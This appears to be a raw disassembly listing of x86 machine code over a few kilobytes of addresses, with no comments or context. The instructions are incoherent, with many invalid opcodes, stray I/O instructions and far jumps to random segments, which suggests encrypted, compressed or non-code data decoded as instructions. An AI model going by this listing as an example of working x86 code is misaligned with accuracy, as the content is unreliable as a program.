  402f77:	or     eax,0x96cb508
  402f7c:	sub    esi,0x6eff94a6
  402f82:	outs   dx,BYTE PTR ds:[esi]
  402f83:	nop
  402f84:	sbb    eax,0xf666abab
  402f89:	aad    0x87
  402f8b:	pop    edx
  402f8c:	inc    ebx
  402f8d:	xchg   ecx,eax
  402f8e:	push   0xfffffff1
  402f90:	seto   BYTE PTR [edi-0x1c]
  402f94:	push   es
  402f95:	cmp    DWORD PTR [edi],esp
  402f97:	fidiv  WORD PTR [edi+0x7730741c]
  402f9d:	dec    eax
  402f9e:	dec    eax
  402f9f:	jb     0x402fec
  402fa1:	scas   al,BYTE PTR es:[edi]
  402fa2:	mov    dl,dl
  402fa4:	repz pop ebp
  402fa6:	xchg   edi,eax
  402fa7:	jp     0x402fec
  402fa9:	mov    eax,gs
  402fab:	pop    edx
  402fac:	xor    al,0x98
  402fae:	clc    
  402faf:	adc    eax,0x1caca11
  402fb4:	xchg   BYTE PTR [ebx],cl
  402fb6:	sub    eax,0xd4405455
  402fbb:	mov    BYTE PTR [ecx-0x1],al
  402fbe:	push   es
  402fbf:	cld    
  402fc0:	jmp    0x402fe4
  402fc2:	imul   esi,DWORD PTR [esi],0xffffff8a
  402fc5:	outs   dx,BYTE PTR ds:[esi]
  402fc6:	xor    esp,esi
  402fc8:	adc    DWORD PTR [esi+0x5b3500d],ecx
  402fce:	xchg   DWORD PTR [edx+0x45],ebx
  402fd1:	loope  0x402f5d
  402fd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fd4:	fldcw  WORD PTR [ecx*8-0x2d590882]
  402fdb:	xchg   edx,eax
  402fdc:	popf   
  402fdd:	mov    ds:0x497ee21f,al
  402fe2:	outs   dx,BYTE PTR ds:[esi]
  402fe3:	imul   ebx,DWORD PTR [edx-0x25949758],0xcf299b5
  402fed:	jmp    0xff086e59
  402ff2:	sub    bh,bl
  402ff4:	or     edi,esi
  402ff6:	jb     0x402fc2
  402ff8:	dec    DWORD PTR ds:0xb04c6f12
  402ffe:	xchg   edi,eax
  402fff:	fsub   QWORD PTR [eax-0xe]
  403002:	jae    0x402f84
  403004:	loop   0x403002
  403006:	sub    al,BYTE PTR [edi]
  403008:	imul   esp,DWORD PTR [ecx+0x70],0xfd269e88
  40300f:	xor    DWORD PTR [edx-0x667c1fa6],esi
  403015:	ins    BYTE PTR es:[edi],dx
  403016:	mov    BYTE PTR [ecx+0x45],dl
  403019:	pushf  
  40301a:	sbb    bh,ch
  40301c:	dec    esp
  40301d:	inc    edx
  40301e:	sti    
  40301f:	out    0x3b,al
  403021:	ret    0xe59d
  403024:	dec    ebx
  403025:	test   al,0x9c
  403027:	adc    eax,0x7e81ade5
  40302c:	push   0xffffffd7
  40302e:	xchg   esp,eax
  40302f:	repnz lods eax,DWORD PTR ds:[esi]
  403031:	int    0xd8
  403033:	jp     0x403094
  403035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403036:	sub    BYTE PTR [eax],bl
  403038:	int3   
  403039:	(bad)  
  40303a:	leave  
  40303b:	add    BYTE PTR [edx-0x5c],0x1c
  40303f:	xor    al,0xa4
  403041:	xchg   edx,eax
  403042:	retf   
  403043:	lods   al,BYTE PTR ds:[esi]
  403044:	test   ebp,0xf58737dc
  40304a:	lods   eax,DWORD PTR ds:[esi]
  40304b:	daa    
  40304c:	mov    dl,0x79
  40304e:	mov    eax,fs
  403050:	in     eax,0x99
  403052:	pop    edi
  403053:	push   eax
  403054:	dec    BYTE PTR [ebx-0x23]
  403057:	shl    DWORD PTR [esi],1
  403059:	mov    bl,0x4c
  40305b:	retf   0x6061
  40305e:	inc    ecx
  40305f:	add    eax,0xe8b17948
  403064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403065:	js     0x403090
  403067:	add    esp,0xffffff95
  40306a:	or     bh,dl
  40306c:	stc    
  40306d:	push   ecx
  40306e:	xchg   edx,eax
  40306f:	xchg   esp,eax
  403070:	or     dh,BYTE PTR cs:[edx]
  403073:	mov    ah,0x51
  403075:	popa   
  403076:	add    DWORD PTR [ecx-0x64e969af],edx
  40307c:	xor    BYTE PTR [esi],ch
  40307e:	push   ebp
  40307f:	fst    st(5)
  403081:	mov    ds:0xa9a54190,al
  403086:	or     al,0xad
  403088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403089:	jecxz  0x403047
  40308b:	retf   0x268e
  40308e:	or     DWORD PTR [ebx+0x7f],eax
  403091:	pop    ebp
  403092:	(bad)  
  403093:	cwde   
  403094:	pop    edi
  403095:	js     0x403051
  403097:	xchg   DWORD PTR [ebx],esi
  403099:	jne    0x403073
  40309b:	into   
  40309c:	sub    BYTE PTR [eax+0x4],bl
  40309f:	addr16 (bad) 
  4030a3:	pop    esp
  4030a4:	in     eax,0xbc
  4030a6:	jb     0x403048
  4030a8:	daa    
  4030a9:	adc    ch,BYTE PTR [edx]
  4030ab:	(bad)  
  4030ad:	jge    0x4030d2
  4030af:	dec    esi
  4030b0:	ja     0x403034
  4030b2:	mov    ah,0x88
  4030b4:	adc    bl,BYTE PTR ds:0xe3677856
  4030ba:	enter  0xe9d6,0x12
  4030be:	(bad)  
  4030bf:	push   ss
  4030c0:	pop    esp
  4030c1:	inc    esi
  4030c2:	add    eax,0x2ddd4cae
  4030c7:	inc    ebp
  4030c8:	rcr    cl,0x3b
  4030cb:	cmp    bl,dl
  4030cd:	or     BYTE PTR [ebp+0x2bec8493],dl
  4030d3:	lock shl ah,cl
  4030d6:	adc    al,al
  4030d8:	cmp    eax,0xa72fef46
  4030dd:	xchg   edi,eax
  4030de:	adc    DWORD PTR ds:0xa4b04c45,edx
  4030e4:	fstp   QWORD PTR [eax]
  4030e6:	or     eax,0x8dc38739
  4030eb:	add    al,0xe4
  4030ed:	out    dx,al
  4030ee:	int3   
  4030ef:	jg     0x403154
  4030f1:	adc    cl,ch
  4030f3:	or     BYTE PTR [edx-0x36177184],ah
  4030f9:	mov    bh,0xba
  4030fb:	push   ss
  4030fc:	xchg   BYTE PTR [ebx],cl
  4030fe:	shr    DWORD PTR [edx-0x64],0xdc
  403102:	sbb    DWORD PTR [esi+0x454cc7a9],ebp
  403108:	call   0xca08:0x301e694a
  40310f:	shl    BYTE PTR [edx+0x2787e712],1
  403115:	add    esp,DWORD PTR [esi+0x4e]
  403118:	cmp    DWORD PTR [ebx+edi*4+0x32],0xffffffd5
  40311d:	sub    ebp,ecx
  40311f:	jmp    ebx
  403121:	ret    0x93fe
  403124:	jge    0x403158
  403126:	dec    esp
  403127:	xchg   edx,eax
  403128:	or     eax,0x15b8e9f7
  40312d:	aam    0xf6
  40312f:	inc    esp
  403130:	push   edi
  403131:	mov    ebx,0x114d7807
  403136:	mov    ah,BYTE PTR [edx+0x5a5c9556]
  40313c:	daa    
  40313d:	stos   BYTE PTR es:[edi],al
  40313e:	sbb    eax,0x2ed8e9b7
  403143:	mov    ebp,0x6d136993
  403148:	dec    ebx
  403149:	aaa    
  40314a:	imul   bl
  40314c:	aaa    
  40314d:	sahf   
  40314e:	or     eax,0xc416bc44
  403153:	inc    edx
  403154:	jbe    0x40318d
  403156:	rcl    DWORD PTR [ebx-0x3b],1
  403159:	jnp    0x403193
  40315b:	push   esp
  40315c:	xchg   ecx,eax
  40315d:	retf   0xb1a6
  403160:	mov    eax,ds:0x591c8cf7
  403165:	bound  ecx,QWORD PTR [esi]
  403167:	fidiv  WORD PTR [esi-0x1f]
  40316a:	push   ebp
  40316b:	jmp    0x74440fd5
  403170:	and    al,0x8a
  403172:	adc    ecx,DWORD PTR ds:0x43836fed
  403178:	in     al,dx
  403179:	cmp    al,0x5d
  40317b:	mov    ecx,0xd2528967
  403180:	stos   DWORD PTR es:[edi],eax
  403181:	sbb    ch,BYTE PTR [esi-0x685b5cb8]
  403187:	lahf   
  403188:	inc    ebp
  403189:	and    al,0x6
  40318b:	das    
  40318c:	(bad)  
  40318d:	cmp    ch,cl
  40318f:	repz mov cl,0x64
  403192:	mov    eax,ds:0xf2ef078e
  403197:	jbe    0x40316d
  403199:	lea    esp,[ecx]
  40319b:	mov    bh,0xc7
  40319d:	js     0x403185
  40319f:	push   ecx
  4031a0:	ins    BYTE PTR es:[edi],dx
  4031a1:	fcom   QWORD PTR [ebp+edx*8+0x61a02097]
  4031a8:	sub    edx,ebp
  4031aa:	pop    ecx
  4031ab:	orps   xmm2,XMMWORD PTR [eax]
  4031ae:	mov    ebp,0xe848ed29
  4031b3:	push   ebp
  4031b4:	scas   al,BYTE PTR es:[edi]
  4031b5:	(bad)  
  4031b6:	xchg   edi,eax
  4031b7:	leave  
  4031b8:	xchg   esp,eax
  4031b9:	push   ebp
  4031ba:	jmp    0x5ed:0xfa5d0acb
  4031c1:	push   ss
  4031c2:	cmp    al,0xc0
  4031c4:	aaa    
  4031c5:	xlat   BYTE PTR ds:[ebx]
  4031c6:	xchg   DWORD PTR [eax],ebx
  4031c8:	in     eax,0x62
  4031ca:	push   0xffffffbc
  4031cc:	fsubr  QWORD PTR [ebx]
  4031ce:	setno  ch
  4031d1:	rol    BYTE PTR [ebx],0x70
  4031d4:	int    0x52
  4031d6:	push   es
  4031d7:	out    dx,eax
  4031d8:	mov    eax,0x566acbe8
  4031dd:	jo     0x40323b
  4031df:	mov    ah,0xa0
  4031e1:	ins    BYTE PTR es:[edi],dx
  4031e2:	in     al,0x8f
  4031e4:	pop    esi
  4031e5:	int3   
  4031e6:	test   DWORD PTR [ebp+0x34a9161e],ebx
  4031ec:	rep lods al,BYTE PTR cs:[esi]
  4031ef:	cld    
  4031f0:	dec    esp
  4031f1:	mov    bl,0x89
  4031f3:	inc    eax
  4031f4:	mov    gs,WORD PTR [ecx]
  4031f6:	dec    eax
  4031f7:	test   BYTE PTR [eax-0x74],0xd6
  4031fb:	popa   
  4031fc:	daa    
  4031fd:	and    BYTE PTR [edi-0x53],0xdc
  403201:	retf   
  403202:	inc    esi
  403203:	into   
  403204:	xchg   ebx,eax
  403205:	dec    eax
  403206:	sbb    dl,BYTE PTR [ecx+edi*1+0xbd509aa]
  40320d:	dec    edi
  40320e:	inc    ebp
  40320f:	mov    eax,ds:0x48ae5551
  403214:	es mov al,0x6a
  403217:	nop
  403218:	mov    esi,0x8fe3a6ad
  40321d:	dec    ecx
  40321e:	int3   
  40321f:	outs   dx,DWORD PTR ds:[esi]
  403220:	inc    ebp
  403221:	mov    esp,0xb57ed13e
  403226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403227:	aas    
  403228:	shl    dl,0x50
  40322b:	mov    dl,0x2e
  40322d:	dec    ebp
  40322e:	aas    
  40322f:	jno    0x40326a
  403231:	adc    esi,DWORD PTR [edi+0x3d]
  403234:	lods   al,BYTE PTR ds:[esi]
  403235:	cld    
  403236:	sbb    eax,0x322127e7
  40323b:	or     al,0x92
  40323d:	jne    0x403282
  40323f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403240:	into   
  403241:	rol    ah,1
  403243:	mov    al,ds:0xe292f2c9
  403248:	ds adc al,0x5c
  40324b:	ins    BYTE PTR es:[edi],dx
  40324c:	cmc    
  40324d:	mov    DWORD PTR [ebx-0x3dc92478],ebp
  403253:	lea    ebp,[bp+si]
  403256:	call   0x668d:0xd08ec6d4
  40325d:	jl     0x4032ab
  40325f:	mov    WORD PTR [ebp-0x61],ss
  403262:	dec    eax
  403263:	mov    ebx,0x85032deb
  403268:	clc    
  403269:	mov    edx,0x3db18eb5
  40326e:	push   eax
  40326f:	cmp    al,0x3d
  403271:	add    esp,ebp
  403273:	cs call 0x618c:0xf7170ed6
  40327b:	cs retf 0xc1b2
  40327f:	fild   WORD PTR [ebx-0x6363226b]
  403285:	jg     0x40325d
  403287:	jmp    FWORD PTR [edi+0x32]
  40328a:	mov    bh,0x97
  40328c:	jnp    0x403240
  40328e:	clc    
  40328f:	or     DWORD PTR [ebx],esp
  403291:	add    esi,DWORD PTR [ebx-0x63]
  403294:	(bad)  
  403295:	pop    edx
  403296:	jns    0x403303
  403298:	push   esp
  403299:	jge    0x403303
  40329b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40329c:	xchg   ecx,eax
  40329d:	sbb    DWORD PTR [ecx+0x374a343c],0xffffffae
  4032a4:	push   0xffffffbc
  4032a6:	sub    ebp,edx
  4032a8:	xor    esp,DWORD PTR [edx+0xf]
  4032ab:	cli    
  4032ac:	leave  
  4032ad:	in     al,dx
  4032ae:	and    eax,0xeb1832ab
  4032b3:	and    DWORD PTR ds:0xdaebca9b,0x85ed55c
  4032bd:	sbb    cl,BYTE PTR [ecx-0x30]
  4032c0:	or     al,BYTE PTR [eax+0x11]
  4032c3:	(bad)  
  4032c4:	mov    ecx,0x1750bff0
  4032c9:	sbb    al,0xa4
  4032cb:	imul   ebp,DWORD PTR [esi+0x387fb0d2],0x3627f75b
  4032d5:	adc    bh,BYTE PTR [edi-0x80]
  4032d8:	cdq    
  4032d9:	xchg   edi,eax
  4032da:	xchg   esi,eax
  4032db:	(bad)  
  4032dc:	pop    ds
  4032dd:	repnz retf 
  4032df:	adc    al,0x85
  4032e1:	xchg   edi,eax
  4032e2:	nop
  4032e3:	push   esi
  4032e4:	xchg   DWORD PTR [ecx],eax
  4032e6:	icebp  
  4032e7:	sub    al,0x45
  4032e9:	adc    edx,DWORD PTR [edi-0x3b]
  4032ec:	add    dh,BYTE PTR [edx]
  4032ee:	imul   ecx,DWORD PTR fs:[ecx],0xb8b92a8
  4032f5:	inc    esi
  4032f6:	cmp    ebx,DWORD PTR [ebx+ebx*1]
  4032f9:	mov    BYTE PTR [ecx+0x3b52eadf],0x8a
  403300:	into   
  403301:	mov    eax,ds:0x79617db8
  403306:	and    BYTE PTR [ecx+0x5b],al
  403309:	sahf   
  40330a:	call   0x1c4f:0xd0cf031f
  403311:	mov    edi,esi
  403313:	pop    edi
  403314:	xor    edi,DWORD PTR [ebx-0x23]
  403317:	pushf  
  403318:	pushf  
  403319:	mov    ch,0xb5
  40331b:	dec    edx
  40331c:	dec    esi
  40331d:	(bad)  
  40331e:	mov    al,ds:0xcab59820
  403323:	sub    BYTE PTR [eax],0xab
  403326:	call   DWORD PTR [ecx+0x49]
  403329:	adc    eax,0x1d876656
  40332e:	mov    cl,0xf8
  403330:	ja     0x40339a
  403332:	stc    
  403333:	(bad)  
  403334:	sub    al,0x96
  403336:	mov    ?,WORD PTR [esp+esi*2-0x6590c19a]
  40333d:	call   0x61f4c1f1
  403342:	test   al,0x9b
  403344:	daa    
  403345:	out    0x56,eax
  403347:	inc    edx
  403348:	leave  
  403349:	das    
  40334a:	cmp    BYTE PTR [eax-0x666b0260],dh
  403350:	add    ebx,eax
  403352:	push   esi
  403353:	div    BYTE PTR [ecx]
  403355:	sbb    al,0x62
  403357:	es lahf 
  403359:	mov    eax,ds:0xe451dfdf
  40335e:	sbb    al,0x6a
  403360:	xor    ebx,esp
  403362:	jle    0x4033ab
  403364:	out    0x29,eax
  403366:	int    0x6f
  403368:	mul    DWORD PTR [ecx+0x4d0f96f3]
  40336e:	out    0xa4,eax
  403370:	mov    eax,0xa108ebba
  403375:	das    
  403376:	test   eax,0x164ebc27
  40337b:	push   0x58af40df
  403380:	inc    eax
  403381:	out    dx,eax
  403382:	in     eax,0x4e
  403384:	repz inc ebp
  403386:	shufps xmm4,XMMWORD PTR [ebp+0x449d77d8],0xcd
  40338e:	pushf  
  40338f:	and    DWORD PTR [edi],ecx
  403391:	cwde   
  403392:	cmp    edi,DWORD PTR [ecx]
  403394:	std    
  403395:	mov    ch,0x22
  403397:	idiv   BYTE PTR [esi]
  403399:	scas   al,BYTE PTR es:[edi]
  40339a:	or     BYTE PTR [ebx+0x6],dh
  40339d:	sahf   
  40339e:	ds inc ebx
  4033a0:	fcmovb st,st(6)
  4033a2:	fidiv  WORD PTR [esp+edi*1+0x50e568e4]
  4033a9:	sbb    eax,0x81940e8d
  4033ae:	stc    
  4033af:	mov    ds:0x566f1ad1,eax
  4033b4:	xor    bh,BYTE PTR [esi]
  4033b6:	cmp    al,0x3f
  4033b8:	int3   
  4033b9:	add    eax,0x274728ab
  4033be:	aas    
  4033bf:	mov    ebx,0x472ae59c
  4033c4:	mov    ebp,0xb167b182
  4033c9:	sub    BYTE PTR [esi-0xbf928bb],dl
  4033cf:	and    ch,BYTE PTR [ecx]
  4033d1:	pop    ds
  4033d2:	xchg   edx,eax
  4033d3:	das    
  4033d4:	push   cs
  4033d5:	cld    
  4033d6:	(bad)  
  4033d7:	jmp    FWORD PTR [edi]
  4033d9:	xchg   BYTE PTR [ebp+0x1c6e5bdc],bh
  4033df:	xchg   DWORD PTR [ebx+eax*1-0x5a],esp
  4033e3:	lea    ecx,[edx+0x1c]
  4033e6:	mov    ah,0xef
  4033e8:	ins    BYTE PTR es:[edi],dx
  4033e9:	ret    
  4033ea:	mov    esp,0xbcc882d1
  4033ef:	sti    
  4033f0:	mov    dh,0x80
  4033f2:	std    
  4033f3:	ins    DWORD PTR es:[edi],dx
  4033f4:	jg     0x4033ed
  4033f6:	dec    eax
  4033f7:	jbe    0x4033d5
  4033f9:	enter  0xdac1,0xa5
  4033fd:	pop    ecx
  4033fe:	dec    ebx
  4033ff:	add    al,BYTE PTR [eax]
  403401:	add    esp,esi
  403403:	(bad)  
  403404:	fnsave [edx-0x57]
  403407:	arpl   sp,ax
  403409:	jg     0x4033e3
  40340b:	sub    BYTE PTR gs:[eax-0x1f],cl
  40340f:	cmp    eax,0x527062f8
  403414:	cmc    
  403415:	lods   ax,WORD PTR ds:[esi]
  403417:	stos   DWORD PTR es:[edi],eax
  403418:	xchg   DWORD PTR [ecx+0x6e],edx
  40341b:	gs mov edi,0x8ca842d7
  403421:	push   ebp
  403422:	jo     0x403438
  403424:	out    0xf8,eax
  403426:	push   ds
  403427:	fdiv   DWORD PTR [ebx-0x58]
  40342a:	je     0x4034a6
  40342c:	or     dh,ah
  40342e:	jae    0x4034ae
  403430:	stos   BYTE PTR es:[edi],al
  403431:	mov    eax,ds:0x8a6ee8d1
  403436:	aam    0xf0
  403438:	pop    esp
  403439:	aaa    
  40343a:	iret   
  40343b:	bound  ebp,QWORD PTR [esi+0x9c0c86e]
  403441:	cs dec ebp
  403443:	adc    eax,0xd54e8ddb
  403448:	sub    DWORD PTR [eax-0x434c80cd],0xffffffbc
  40344f:	test   DWORD PTR [ebx-0x14],ebp
  403452:	jmp    DWORD PTR [ebx-0x76]
  403455:	adc    edi,esp
  403457:	push   eax
  403458:	mov    gs,WORD PTR [edx+ecx*4-0x56]
  40345c:	inc    esp
  40345d:	mov    bh,0x8c
  40345f:	xor    DWORD PTR [ebx],ebx
  403461:	lock (bad) [ebp+0x33d4d063]
  403468:	lds    esp,FWORD PTR [ebx-0x1f724130]
  40346e:	xchg   edx,eax
  40346f:	ror    edi,cl
  403471:	out    dx,eax
  403472:	xchg   esp,eax
  403473:	mov    ds:0x73d20da5,al
  403478:	cdq    
  403479:	mov    cs,WORD PTR [ebp-0x41c53804]
  40347f:	sub    eax,0xd252a873
  403484:	mov    bl,0x52
  403486:	in     al,0xcf
  403488:	stc    
  403489:	cmp    eax,0x6b53f1c9
  40348e:	inc    esp
  40348f:	mov    al,0x4f
  403491:	mov    ds:0x4f227add,eax
  403496:	adc    al,0x5d
  403498:	mov    ah,0x84
  40349a:	jecxz  0x4034f7
  40349c:	inc    eax
  40349d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40349e:	sub    al,0x25
  4034a0:	xor    bl,bh
  4034a2:	popf   
  4034a3:	lds    ebx,FWORD PTR [eax]
  4034a5:	test   DWORD PTR [esi],ebx
  4034a7:	int3   
  4034a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034a9:	sti    
  4034aa:	and    eax,eax
  4034ac:	pop    eax
  4034ad:	push   edx
  4034ae:	jp     0x403497
  4034b0:	loope  0x4034e6
  4034b2:	ror    BYTE PTR [ecx],0xcc
  4034b5:	cld    
  4034b6:	jmp    0x6dde:0xf7633905
  4034bd:	inc    ebx
  4034be:	pop    eax
  4034bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034c0:	sub    ecx,0x7c
  4034c3:	sbb    DWORD PTR [ebx-0x7a],eax
  4034c6:	push   ebx
  4034c7:	xor    edx,DWORD PTR [ebp+ebx*8+0x32]
  4034cb:	scas   al,BYTE PTR es:[edi]
  4034cc:	cs push eax
  4034ce:	pop    edi
  4034cf:	mov    ecx,0x23013de8
  4034d4:	wbinvd 
  4034d6:	jno    0x40353b
  4034d8:	daa    
  4034d9:	shr    DWORD PTR [esi+ecx*4+0x30],1
  4034dd:	xchg   edi,eax
  4034de:	sub    cl,BYTE PTR [esi+edi*1+0x6b]
  4034e2:	xor    BYTE PTR [esi+ebp*1],cl
  4034e5:	adc    eax,0x380a8c1e
  4034ea:	mov    esp,0x9fd0d3b4
  4034ef:	idiv   DWORD PTR [si+0x5f]
  4034f3:	mov    esp,DWORD PTR ds:0xa283a946
  4034f9:	fs add eax,0x945a52eb
  4034ff:	pusha  
  403500:	or     BYTE PTR [edx+0x7b],bl
  403503:	lahf   
  403504:	loopne 0x403585
  403506:	mov    WORD PTR [edx],?
  403508:	sahf   
  403509:	mov    edx,0x5153989a
  40350e:	cmp    al,0x6
  403510:	push   ss
  403511:	rcl    DWORD PTR [eax+0x20],1
  403514:	push   esi
  403515:	fild   DWORD PTR [edx]
  403517:	idiv   DWORD PTR [ecx+0x3d7b89d1]
  40351d:	mov    edi,0x89d4cc97
  403522:	cs add DWORD PTR es:[edi-0x51df191a],edx
  40352a:	and    BYTE PTR [esi],0x9e
  40352d:	clc    
  40352e:	test   al,0x62
  403530:	dec    ecx
  403532:	pop    ss
  403533:	jbe    0x403570
  403535:	push   ss
  403536:	jae    0x403597
  403538:	pop    edi
  403539:	mov    WORD PTR [ebx*8+0x7cbc083b],cs
  403540:	(bad)
  403543:	inc    edi
  403544:	dec    edx
  403545:	sahf   
  403546:	fcmovbe st,st(5)
  403548:	jmp    0x61b41d53
  40354d:	inc    esi
  40354e:	fist   DWORD PTR [ebp+0x2d]
  403551:	mov    DWORD PTR [esi],ecx
  403553:	jge    0x4035cf
  403555:	mov    edx,0xafd8730
  40355a:	sub    esp,DWORD PTR es:[ebx+0x26]
  40355e:	jo     0x4034f9
  403560:	cli    
  403561:	and    al,BYTE PTR [ebp-0x56]
  403564:	gs add edi,ebp
  403567:	inc    ebp
  403568:	hlt    
  403569:	mov    edi,0x551dec09
  40356e:	adc    BYTE PTR [eax-0x19cff30],dl
  403574:	pop    ds
  403575:	js     0x40352a
  403577:	popa   
  403578:	jmp    FWORD PTR [eax+0x209e464a]
  40357e:	into   
  40357f:	ins    DWORD PTR es:[edi],dx
  403580:	mov    al,ds:0x48a4357
  403585:	pop    ebx
  403586:	push   ebp
  403587:	imul   ecx,DWORD PTR [edi+ebx*8+0xe867a2d],0x32be977f
  403592:	leave  
  403593:	rol    BYTE PTR [ebx+0x5caff3eb],cl
  403599:	clc    
  40359a:	add    ebp,ebp
  40359c:	aaa    
  40359d:	mov    bl,0xcf
  40359f:	push   ss
  4035a0:	jb     0x4035e9
  4035a2:	aaa    
  4035a3:	xchg   ebx,eax
  4035a4:	mov    ?,WORD PTR ds:0x8d930c8b
  4035aa:	test   eax,0x4303b20c
  4035af:	nop
  4035b0:	inc    eax
  4035b1:	inc    esi
  4035b2:	adc    ch,BYTE PTR [ebp-0x2fab52a5]
  4035b8:	movups xmm1,xmm0
  4035bb:	inc    ecx
  4035bc:	dec    esp
  4035bd:	daa    
  4035be:	cmp    al,0x4b
  4035c0:	pop    ss
  4035c1:	mov    al,0xe8
  4035c3:	dec    edx
  4035c4:	pop    ebp
  4035c5:	sub    eax,0x8a9ba557
  4035ca:	cmp    al,0x33
  4035cc:	je     0x4035a3
  4035ce:	imul   eax,DWORD PTR [ebp+0x73],0xffffff80
  4035d2:	adc    eax,DWORD PTR [esi+eax*4-0x6c7597c9]
  4035d9:	test   bh,dh
  4035db:	loop   0x4035ad
  4035dd:	outs   dx,DWORD PTR ds:[esi]
  4035de:	in     eax,dx
  4035df:	dec    eax
  4035e0:	lods   al,BYTE PTR ds:[esi]
  4035e1:	push   ds
  4035e2:	jle    0x40356a
  4035e4:	jne    0x403573
  4035e6:	xor    eax,0x9243a703
  4035eb:	mov    DWORD PTR [esi],ebx
  4035ed:	xchg   ecx,eax
  4035ee:	sbb    DWORD PTR [esi-0x2a1578a7],edx
  4035f4:	aam    0x85
  4035f6:	push   ebx
  4035f7:	out    dx,al
  4035f8:	mov    BYTE PTR [eax+eiz*2],cl
  4035fb:	pop    ecx
  4035fc:	xor    DWORD PTR [edi-0x3c1401c],esp
  403602:	mov    bl,0x86
  403604:	fiadd  DWORD PTR [esi]
  403606:	mov    ds:0x94b52c89,al
  40360b:	mov    eax,0x9ff05aa3
  403610:	pushf  
  403611:	xor    eax,0xbe2638d8
  403616:	loope  0x403650
  403618:	add    esi,ecx
  40361a:	in     eax,dx
  40361b:	(bad)  
  40361c:	addr16 mov dh,0xe7
  40361f:	in     al,dx
  403620:	das    
  403621:	sbb    ah,BYTE PTR [ecx+ecx*8-0x1a621a50]
  403628:	jnp    0x4035d9
  40362a:	add    DWORD PTR [eax],edx
  40362c:	test   al,0xc8
  40362e:	fisttp DWORD PTR [ebx]
  403630:	out    dx,al
  403631:	xor    al,0xd9
  403633:	nop
  403634:	sub    ch,bh
  403636:	mov    eax,0x1abfa301
  40363b:	inc    eax
  40363c:	fadd   st,st(7)
  40363e:	cs stos DWORD PTR es:[edi],eax
  403640:	dec    eax
  403641:	cs dec esi
  403643:	icebp  
  403644:	add    BYTE PTR [edi+0x1d],0x8b
  403648:	(bad)  
  403649:	xchg   si,ax
  40364b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40364d:	dec    eax
  40364e:	aas    
  40364f:	sbb    BYTE PTR [eax+0x48],cl
  403652:	imul   ecx,DWORD PTR [ecx-0x71],0x7dcd348
  403659:	out    dx,al
  40365a:	loopne 0x403625
  40365c:	js     0x4036ce
  40365e:	dec    esp
  40365f:	fxch   st(1)
  403661:	jp     0x4036d0
  403663:	pop    es
  403664:	into   
  403665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403666:	jae    0x40369d
  403668:	addr16 popf 
  40366a:	and    BYTE PTR [edi+edi*1-0x3],cl
  40366e:	xchg   edx,eax
  40366f:	or     DWORD PTR [ebx-0x22741a84],edi
  403675:	js     0x3e30e2c6
  40367b:	ins    BYTE PTR es:[edi],dx
  40367c:	xchg   ecx,eax
  40367d:	es ja  0x403666
  403680:	das    
  403681:	sbb    dh,BYTE PTR [edx]
  403683:	sbb    BYTE PTR [esi],bh
  403685:	sub    al,0x2a
  403687:	(bad)  
  403688:	jecxz  0x4036c5
  40368a:	push   ebp
  40368b:	or     DWORD PTR [edi],ebp
  40368d:	cmp    bl,ah
  40368f:	aad    0x80
  403691:	cmovns ebx,esp
  403694:	into   
  403695:	popf   
  403696:	adc    al,0xf6
  403698:	das    
  403699:	push   edx
  40369a:	repz xor al,0xe
  40369d:	dec    esp
  40369e:	cmp    eax,0x3b35486e
  4036a3:	push   es
  4036a4:	push   ds
  4036a5:	mov    ch,0x59
  4036a7:	stos   DWORD PTR es:[edi],eax
  4036a8:	addr16 pop eax
  4036aa:	push   ecx
  4036ab:	lds    edx,FWORD PTR [ebx+0x77]
  4036ae:	push   0xcf30c83
  4036b3:	sbb    ebx,DWORD PTR [eax+0x676250e8]
  4036b9:	(bad)  
  4036bb:	cwde   
  4036bc:	push   esi
  4036bd:	pop    edx
  4036be:	adc    BYTE PTR [esi-0x4a],0xdd
  4036c2:	xlat   BYTE PTR ds:[ebx]
  4036c3:	push   edi
  4036c4:	and    bh,bl
  4036c6:	sub    eax,0xe401b6bb
  4036cb:	xor    esp,ebx
  4036cd:	enter  0x4e86,0x1d
  4036d1:	test   eax,0x1e95da42
  4036d6:	lock shr DWORD PTR [edx],0x1c
  4036da:	aad    0xb0
  4036dc:	cmc    
  4036dd:	nop
  4036de:	or     al,0xa
  4036e0:	push   ebx
  4036e1:	fisttp DWORD PTR [eax+0x7d9eb1d8]
  4036e7:	enter  0x1e9,0x1c
  4036eb:	add    dl,ch
  4036ed:	popf   
  4036ee:	fsubr  DWORD PTR [esi-0x59]
  4036f1:	test   al,0x29
  4036f3:	test   eax,0xec2fe7d8
  4036f8:	dec    ebx
  4036f9:	aad    0x5e
  4036fb:	(bad)  ss:[eax+0x54969a27]
  403702:	aad    0xd0
  403704:	(bad)  
  403706:	push   ds
  403707:	jle    0x4036dd
  403709:	or     bh,bl
  40370b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40370c:	push   ebp
  40370d:	mov    ds:0xb2c56081,eax
  403712:	nop
  403713:	lock push ss
  403715:	sbb    ah,BYTE PTR [ecx+0x30]
  403718:	and    DWORD PTR ds:0x7d89cec7,ecx
  40371e:	or     DWORD PTR [edi],esi
  403720:	neg    BYTE PTR [esi+edi*1]
  403723:	mov    al,ds:0xeb9f6a20
  403728:	rcl    eax,0x2e
  40372b:	imul   esi,DWORD PTR [ecx-0x60],0xffffffb5
  40372f:	sub    ecx,esp
  403731:	pop    edi
  403732:	cmp    BYTE PTR [edx],ah
  403734:	sbb    ebp,DWORD PTR [ebx+0x70e7356]
  40373a:	adc    eax,DWORD PTR [ebp+0x4c]
  40373d:	fisubr DWORD PTR [ebp-0x73037532]
  403743:	hlt    
  403744:	pushf  
  403745:	dec    esi
  403746:	jno    0x403772
  403748:	push   eax
  403749:	inc    esi
  40374a:	inc    eax
  40374b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
